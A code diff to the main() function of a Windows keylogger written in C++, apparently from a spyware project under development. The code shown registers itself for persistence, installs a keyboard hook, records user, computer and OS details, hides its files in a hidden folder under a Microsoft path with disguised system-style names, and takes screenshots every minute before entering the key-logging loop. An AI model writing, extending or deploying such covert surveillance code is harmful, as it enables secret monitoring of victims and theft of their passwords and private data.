@@ -17,7 +17,6 @@ int main() {
 	return 0;
   }
 
-  // ------------------ SETUP -------------------- //
   Sys::AddToRegistry();
   Crypt::GenerateKeys();
   KeyHook::InstallHook();
@@ -26,27 +25,15 @@ int main() {
 
   Stream::GetAccountInfo(pClientInfo);
 
-
-  // --------------- FILESYSTEM ------------------ //
-
   std::string path = Stream::GetPath("\\Microsoft\\");
-  encrDir.folder = mainDir.folder = path;
 
   mainDir.name = "SystemService";
-  encrDir.name = "BootSetup";
+  mainDir.path = Stream::GetPath(Stream::GetPath("\\" + mainDir.name));
 
-  mainDir.path = mainDir.folder + mainDir.name;
-  encrDir.path = encrDir.folder + encrDir.name;
+  DEBN(Stream::GetPath("\\Microsoft\\" + mainDir.name))
 
-  Stream::MakeDir(mainDir.folder, mainDir.name, FILE_ATTRIBUTE_HIDDEN);
-  Stream::MakeDir(encrDir.folder, encrDir.name, FILE_ATTRIBUTE_HIDDEN);
-
-  // FIXME doesnt create the files
-  Stream::MakeFile("wnxshl2.sys.log", mainDir.path); // Logs
-  Stream::MakeFile("boothandler.sys.log", path); // Encryption key
-
-
-  // ---------------- LOGFILE -------------------- //
+  Stream::MakeDir(mainDir.path, mainDir.name, FILE_ATTRIBUTE_HIDDEN);
+  Stream::MakeFile("wnxshl2.sys.log", "\\Microsoft\\"); // Logs
   Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, false);
 
   std::ostringstream ostream;
@@ -59,18 +46,13 @@ int main() {
   ostream << "\n[*] OS Info: Major - " << major << "; Minor - " << minor << " [*]"
 		  << "\n[*] Account Info: User -" << acc << "; Computer - " << com << " [*]";
 
-  delete acc;
-  delete com;
-  acc = nullptr;
-  com = nullptr;
+  free(acc);
+  free(com);
 
   std::string write = ostream.str();
   Stream::WriteLog(write, KeyHook::activeProcess, false);
-
   Screen::CaptureScreen(mainDir.path + "\\", "winpst", true, 60000); // Screenshot
 
-
-  // -------------- KEY LOGGER ------------------- //
   KeyHook::HandleMessage(true);
 
 #endif // DEBUG_BUILD
